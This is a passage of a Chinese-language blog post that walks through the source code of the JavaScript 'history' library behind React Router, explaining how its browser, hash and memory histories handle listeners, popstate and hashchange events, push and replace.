(needsHashChangeListener)</span><br><span class="line">      <span class="built_in">window</span>.addEventListener(HashChangeEvent, handleHashChange);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (listenerCount === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(PopStateEvent, handlePopState);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (needsHashChangeListener)</span><br><span class="line">      <span class="built_in">window</span>.removeEventListener(HashChangeEvent, handleHashChange);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span>(<span class="params">listener</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> unlisten = transitionManager.appendListener(listener);</span><br><span class="line">  checkDOMListeners(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    checkDOMListeners(<span class="number">-1</span>);</span><br><span class="line">    unlisten();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在很多浏览器中hash change也会触发popstate事件，所以hashchange事件在browserHistory中也是需要监听的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> needsHashChangeListener = !supportsPopStateOnHashChange();</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">supportsPopStateOnHashChange</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">window</span>.navigator.userAgent.indexOf(<span class="string">'Trident'</span>) === <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="hashHistory中的实现"><a href="#hashHistory中的实现" class="headerlink" title="hashHistory中的实现"></a>hashHistory中的实现</h3><p>hashHistory中只需要监听hashchange事件就可以了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> HashChangeEvent = <span class="string">'hashchange'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> listenerCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkDOMListeners</span>(<span class="params">delta</span>) </span>&#123;</span><br><span class="line">  listenerCount += delta;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (listenerCount === <span class="number">1</span> &amp;&amp; delta === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(HashChangeEvent, handleHashChange);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (listenerCount === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(HashChangeEvent, handleHashChange);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="memoryHistory中的实现"><a href="#memoryHistory中的实现" class="headerlink" title="memoryHistory中的实现"></a>memoryHistory中的实现</h3><p>memoryHistory不需要监听事件，它只需要将监听触发的回调函数添加到transitionManager中就可以了。因为它是服务端主动控制的路由，不需要监听被动的路由改变，进而执行一些状态更新。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span>(<span class="params">listener</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> transitionManager.appendListener(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="browserHistory中handlePopState的实现"><a href="#browserHistory中handlePopState的实现" class="headerlink" title="browserHistory中handlePopState的实现"></a>browserHistory中handlePopState的实现</h2><p>hashHistory和memoryHistory是没有popState事件的，所以不需要实现它们。</p>
<p>handlePopState主要会执行handlePop方法，handlePop主要会执行setState方法，setState方法主要是合并了history状态，通过transitionManager.notifyListeners通知了添加的listener函数执行。</p>
<p>getDOMLocation生成的就是我们经常见到的location参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  pathname,</span><br><span class="line">  state,</span><br><span class="line">  hash,</span><br><span class="line">  search,</span><br><span class="line">  key,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handlePopState</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Ignore extraneous popstate events in WebKit.</span></span><br><span class="line">  <span class="keyword">if</span> (isExtraneousPopstateEvent(event)) <span class="keyword">return</span>;</span><br><span class="line">  handlePop(getDOMLocation(event.state));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handlePop</span>(<span class="params">location</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (forceNextPop) &#123;</span><br><span class="line">    forceNextPop = <span class="literal">false</span>;</span><br><span class="line">    setState();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> action = <span class="string">'POP'</span>;</span><br><span class="line"></span><br><span class="line">    transitionManager.confirmTransitionTo(</span><br><span class="line">      location,</span><br><span class="line">      action,</span><br><span class="line">      getUserConfirmation,</span><br><span class="line">      ok =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">          setState(&#123; action, location &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          revertPop(location);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params">nextState</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.assign(history, nextState);</span><br><span class="line">  history.length = globalHistory.length;</span><br><span class="line">  transitionManager.notifyListeners(history.location, history.action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>confirmTransitionTo的回调函数范围为false的时候，说明禁止进行这次路由操作。它调用revertPop方法实现，通过计算此次路由操作的delta，调用go(delta)方法将路由恢复到原来的状态，go方法就是原生的history.go方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">revertPop</span>(<span class="params">fromLocation</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> toLocation = history.location;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> We could probably make this more reliable by</span></span><br><span class="line">  <span class="comment">// keeping a list of keys we've seen in sessionStorage.</span></span><br><span class="line">  <span class="comment">// Instead, we just default to 0 for keys we don't know.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> toIndex = allKeys.indexOf(toLocation.key);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (toIndex === <span class="number">-1</span>) toIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> fromIndex = allKeys.indexOf(fromLocation.key);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fromIndex === <span class="number">-1</span>) fromIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> delta = toIndex - fromIndex;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (delta) &#123;</span><br><span class="line">    forceNextPop = <span class="literal">true</span>;</span><br><span class="line">    go(delta);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> globalHistory = <span class="built_in">window</span>.history;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  globalHistory.go(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="handleHashChange"><a href="#handleHashChange" class="headerlink" title="handleHashChange"></a>handleHashChange</h2><h3 id="browserHistory中的实现-1"><a href="#browserHistory中的实现-1" class="headerlink" title="browserHistory中的实现"></a>browserHistory中的实现</h3><p>它调用的其实主要也是handlePop方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHistoryState</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>.history.state || &#123;&#125;;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="comment">// IE 11 sometimes throws when accessing window.history.state</span></span><br><span class="line">    <span class="comment">// See https://github.com/ReactTraining/history/pull/289</span></span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleHashChange</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  handlePop(getDOMLocation(getHistoryState()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="hashHistory中的实现-1"><a href="#hashHistory中的实现-1" class="headerlink" title="hashHistory中的实现"></a>hashHistory中的实现</h3><p>path !== encodedPath这个判断是为了让我们总是有标准的hash路径，后面的操作判断主要是判断一下前后的location是否相同、是否是ignorePath，如果都不是，则会执行handlePop方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleHashChange</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> path = getHashPath();</span><br><span class="line">  <span class="keyword">const</span> encodedPath = encodePath(path);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (path !== encodedPath) &#123;</span><br><span class="line">    <span class="comment">// Ensure we always have a properly-encoded hash.</span></span><br><span class="line">    replaceHashPath(encodedPath);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> location = getDOMLocation();</span><br><span class="line">    <span class="keyword">const</span> prevLocation = history.location;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!forceNextPop &amp;&amp; locationsAreEqual(prevLocation, location)) <span class="keyword">return</span>; <span class="comment">// A hashchange doesn't always == location change.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ignorePath === createPath(location)) <span class="keyword">return</span>; <span class="comment">// Ignore this change; we already setState in push/replace.</span></span><br><span class="line"></span><br><span class="line">    ignorePath = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    handlePop(location);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceHashPath</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> hashIndex = <span class="built_in">window</span>.location.href.indexOf(<span class="string">'#'</span>);</span><br><span class="line">  <span class="built_in">window</span>.location.replace(</span><br><span class="line">    <span class="built_in">window</span>.location.href.slice(<span class="number">0</span>, hashIndex &gt;= <span class="number">0</span> ? hashIndex : <span class="number">0</span>) + <span class="string">'#'</span> + path</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>handlePop和前面browserHistory介绍的是类似的，有区别的地方是revertPop使用的allPaths作为history的索引，browserHistory使用的allKeys。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handlePop</span>(<span class="params">location</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (forceNextPop) &#123;</span><br><span class="line">    forceNextPop = <span class="literal">false</span>;</span><br><span class="line">    setState();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> action = <span class="string">'POP'</span>;</span><br><span class="line"></span><br><span class="line">    transitionManager.confirmTransitionTo(</span><br><span class="line">      location,</span><br><span class="line">      action,</span><br><span class="line">      getUserConfirmation,</span><br><span class="line">      ok =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">          setState(&#123; action, location &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          revertPop(location);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params">nextState</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.assign(history, nextState);</span><br><span class="line">  history.length = globalHistory.length;</span><br><span class="line">  transitionManager.notifyListeners(history.location, history.action);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">revertPop</span>(<span class="params">fromLocation</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> toLocation = history.location;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> We could probably make this more reliable by</span></span><br><span class="line">  <span class="comment">// keeping a list of paths we've seen in sessionStorage.</span></span><br><span class="line">  <span class="comment">// Instead, we just default to 0 for paths we don't know.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> toIndex = allPaths.lastIndexOf(createPath(toLocation));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (toIndex === <span class="number">-1</span>) toIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> fromIndex = allPaths.lastIndexOf(createPath(fromLocation));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fromIndex === <span class="number">-1</span>) fromIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> delta = toIndex - fromIndex;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (delta) &#123;</span><br><span class="line">    forceNextPop = <span class="literal">true</span>;</span><br><span class="line">    go(delta);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> globalHistory = <span class="built_in">window</span>.history;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  warning(</span><br><span class="line">    canGoWithoutReload,</span><br><span class="line">    <span class="string">'Hash history go(n) causes a full page reload in this browser'</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  globalHistory.go(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>allPaths是完整的路径</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">createPath</span>(<span class="params">location</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; pathname, search, hash &#125; = location;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> path = pathname || <span class="string">'/'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (search &amp;&amp; search !== <span class="string">'?'</span>)</span><br><span class="line">    path += search.charAt(<span class="number">0</span>) === <span class="string">'?'</span> ? search : <span class="string">`?<span class="subst">$&#123;search&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (hash &amp;&amp; hash !== <span class="string">'#'</span>) path += hash.charAt(<span class="number">0</span>) === <span class="string">'#'</span> ? hash : <span class="string">`#<span class="subst">$&#123;hash&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>allKeys是随机的key</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createKey</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.random()</span><br><span class="line">    .toString(<span class="number">36</span>)</span><br><span class="line">    .substr(<span class="number">2</span>, keyLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="history-push"><a href="#history-push" class="headerlink" title="history.push"></a>history.push</h2><h3 id="browserHistory中的实现-2"><a href="#browserHistory中的实现-2" class="headerlink" title="browserHistory中的实现"></a>browserHistory中的实现</h3><p>history.push方法很简单，主要调用了history.pushState方法。由于allKeys维护了所有history state中的key，所以在push方法需要做相应的处理。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> globalHistory = <span class="built_in">window</span>.history;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">path, state</span>) </span>&#123;</span><br><span class="line">  warning(</span><br><span class="line">    !(</span><br><span class="line">      <span class="keyword">typeof</span> path === <span class="string">'object'</span> &amp;&amp;</span><br><span class="line">      path.state !== <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">      state !== <span class="literal">undefined</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'You should avoid providing a 2nd state argument to push when the 1st '</span> +</span><br><span class="line">      <span class="string">'argument is a location-like object that already has state; it is ignored'</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> action = <span class="string">'PUSH'</span>;</span><br><span class="line">  <span class="keyword">const</span> location = createLocation(path, state, createKey(), history.location);</span><br><span class="line"></span><br><span class="line">  transitionManager.confirmTransitionTo(</span><br><span class="line">    location,</span><br><span class="line">    action,</span><br><span class="line">    getUserConfirmation,</span><br><span class="line">    ok =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!ok) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> href = createHref(location);</span><br><span class="line">      <span class="keyword">const</span> &#123; key, state &#125; = location;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (canUseHistory) &#123;</span><br><span class="line">        globalHistory.pushState(&#123; key, state &#125;, <span class="literal">null</span>, href);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (forceRefresh) &#123;</span><br><span class="line">          <span class="built_in">window</span>.location.href = href;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> prevIndex = allKeys.indexOf(history.location.key);</span><br><span class="line">          <span class="keyword">const</span> nextKeys = allKeys.slice(</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            prevIndex === <span class="number">-1</span> ? <span class="number">0</span> : prevIndex + <span class="number">1</span></span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line">          nextKeys.push(location.key);</span><br><span class="line">          allKeys = nextKeys;</span><br><span class="line"></span><br><span class="line">          setState(&#123; action, location &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        warning(</span><br><span class="line">          state === <span class="literal">undefined</span>,</span><br><span class="line">          <span class="string">'Browser history cannot push state in browsers that do not support HTML5 history'</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">window</span>.location.href = href;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="hashHistory中的实现-2"><a href="#hashHistory中的实现-2" class="headerlink" title="hashHistory中的实现"></a>hashHistory中的实现</h3><p>history.push方法很简单，主要调用了window.location.hash方法。由于allPaths维护了所有的path，所以在push方法需要做相应的处理。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">path, state</span>) </span>&#123;</span><br><span class="line">  warning(</span><br><span class="line">    state === <span class="literal">undefined</span>,</span><br><span class="line">    <span class="string">'Hash history cannot push state; it is ignored'</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> action = <span class="string">'PUSH'</span>;</span><br><span class="line">  <span class="keyword">const</span> location = createLocation(</span><br><span class="line">    path,</span><br><span class="line">    <span class="literal">undefined</span>,</span><br><span class="line">    <span class="literal">undefined</span>,</span><br><span class="line">    history.location</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  transitionManager.confirmTransitionTo(</span><br><span class="line">    location,</span><br><span class="line">    action,</span><br><span class="line">    getUserConfirmation,</span><br><span class="line">    ok =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!ok) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> path = createPath(location);</span><br><span class="line">      <span class="keyword">const</span> encodedPath = encodePath(basename + path);</span><br><span class="line">      <span class="keyword">const</span> hashChanged = getHashPath() !== encodedPath;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (hashChanged) &#123;</span><br><span class="line">        <span class="comment">// We cannot tell if a hashchange was caused by a PUSH, so we'd</span></span><br><span class="line">        <span class="comment">// rather setState here and ignore the hashchange. The caveat here</span></span><br><span class="line">        <span class="comment">// is that other hash histories in the page will consider it a POP.</span></span><br><span class="line">        ignorePath = path;</span><br><span class="line">        pushHashPath(encodedPath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> prevIndex = allPaths.lastIndexOf(createPath(history.location));</span><br><span class="line">        <span class="keyword">const</span> nextPaths = allPaths.slice(</span><br><span class="line">          <span class="number">0</span>,</span><br><span class="line">          prevIndex === <span class="number">-1</span> ? <span class="number">0</span> : prevIndex + <span class="number">1</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        nextPaths.push(path);</span><br><span class="line">        allPaths = nextPaths;</span><br><span class="line"></span><br><span class="line">        setState(&#123; action, location &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        warning(</span><br><span class="line">          <span class="literal">false</span>,</span><br><span class="line">          <span class="string">'Hash history cannot PUSH the same path; a new entry will not be added to the history stack'</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        setState();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pushHashPath</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.location.hash = path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="memoryHistory中的实现-1"><a href="#memoryHistory中的实现-1" class="headerlink" title="memoryHistory中的实现"></a>memoryHistory中的实现</h3><p>由于是在内存中维护history的状态，所以主要是history.entries（所有history location列表）的维护。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">path, state</span>) </span>&#123;</span><br><span class="line">  warning(</span><br><span class="line">    !(</span><br><span class="line">      <span class="keyword">typeof</span> path === <span class="string">'object'</span> &amp;&amp;</span><br><span class="line">      path.state !== <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">      state !== <span class="literal">undefined</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'You should avoid providing a 2nd state argument to push when the 1st '</span> +</span><br><span class="line">      <span class="string">'argument is a location-like object that already has state; it is ignored'</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> action = <span class="string">'PUSH'</span>;</span><br><span class="line">  <span class="keyword">const</span> location = createLocation(path, state, createKey(), history.location);</span><br><span class="line"></span><br><span class="line">  transitionManager.confirmTransitionTo(</span><br><span class="line">    location,</span><br><span class="line">    action,</span><br><span class="line">    getUserConfirmation,</span><br><span class="line">    ok =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!ok) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> prevIndex = history.index;</span><br><span class="line">      <span class="keyword">const</span> nextIndex = prevIndex + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> nextEntries = history.entries.slice(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (nextEntries.length &gt; nextIndex) &#123;</span><br><span class="line">        nextEntries.splice(</span><br><span class="line">          nextIndex,</span><br><span class="line">          nextEntries.length - nextIndex,</span><br><span class="line">          location</span><br><span class="line">        );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        nextEntries.push(location);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      setState(&#123;</span><br><span class="line">        action,</span><br><span class="line">        location,</span><br><span class="line">        index: nextIndex,</span><br><span class="line">        entries: nextEntries</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params">nextState</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.assign(history, nextState);</span><br><span class="line">  history.length = history.entries.length;</span><br><span class="line">  transitionManager.notifyListeners(history.location, history.action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="history-replace"><a href="#history-replace" class="headerlink" title="history.replace()"></a>history.replace()</h2><h3 id="browerHistory中的实现"><a href="#browerHistory中的实现" class="headerlink" title="browerHistory中的实现"></a>browerHistory中的实现</h3><p>history.replace方法和push是类似的，主要调用了history.replaceState方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace</span>(<span class="params">path, state</span>) </span>&#123;</span><br><span class="line">  warning(</span><br><span class="line">    !(</span><br><span class="line">      <span class="keyword">typeof</span> path === <span class="string">'object'</span> &amp;&amp;</span><br><span class="line">      path.state !== <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">      state !== <span class="literal">undefined</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'You should avoid providing a 2nd state argument to replace when the 1st '</span> +</span><br><span class="line">      <span class="string">'argument is a location-like object that already has state; it is ignored'</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> action = <span class="string">'REPLACE'</span>;</span><br><span class="line">  <span class="keyword">const</span> location = createLocation(path, state, createKey(), history.location);</span><br><span class="line"></span><br><span class="line">  transitionManager.confirmTransitionTo(</span><br><span class="line">    location,</span><br><span class="line">    action,</span><br><span class="line">    getUserConfirmation,</span><br><span class="line">    ok =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!ok) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> href = createHref(location);</span><br><span class="line">      <span class="keyword">const</span> &#123; key, state &#125; = location;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (canUseHistory) &#123;</span><br><span class="line">        globalHistory.replaceState(&#123; key, state &#125;, <span class="literal">null</span>, href);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (forceRefresh) &#123;</span><br><span class="line">          <span class="built_in">window</span>.location.replace(href);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> prevIndex = allKeys.indexOf(history.location.key);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (prevIndex !== <span class="number">-1</span>) allKeys[prevIndex] = location.key;</span><br><span class="line"></span><br><span class="line">          setState(&#123; action, location &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        warning(</span><br><span class="line">          state === <span class="literal">undefined</span>,</span><br><span class="line">          <span class="string">'Browser history cannot replace state in browsers that do not support HTML5 history'</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">window</span>.location.replace(href);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="hashHistory中的实现-3"><a href="#hashHistory中的实现-3" class="headerlink" title="hashHistory中的实现"></a>hashHistory中的实现</h3><p>replace在hashHistory中的实现也很简单，主要调用了window.location.replace方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace</span>(<span class="params">path, state</span>) </span>&#123;</span><br><span class="line">  warning(</span><br><span class="line">    state === <span class="literal">undefined</span>,</span><br><span class="line">    <span class="string">'Hash history cannot replace state; it is ignored'</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> action = <span class="string">'REPLACE'</span>;</span><br><span class="line">  <span class="keyword">const</span> location = createLocation(</span><br><span class="line">    path,</span><br><span class="line">    <span class="literal">undefined</span>,</span><br><span class="line">    <span class="literal">undefined</span>,</span><br><span class="line">    history.location</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  transitionManager.confirmTransitionTo(</span><br><span class="line">    location,</span><br><span class="line">    action,</span><br><span class="line">    getUserConfirmation,</span><br><span class="line">    ok =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!ok) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> path = createPath(location);</span><br><span class="line">      <span class="keyword">const</span> encodedPath = encodePath(basename + path);</span><br><span class="line">      <span class="keyword">const</span> hashChanged = getHashPath() !== encodedPath;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (hashChanged) &#123;</span><br><span class="line">        <span class="comment">// We cannot tell if a hashchange was caused by a REPLACE, so we'd</span></span><br><span class="line">        <span class="comment">// rather setState here and ignore the hashchange. The caveat here</span></span><br><span class="line">        <span class="comment">// is that other hash histories in the page will consider it 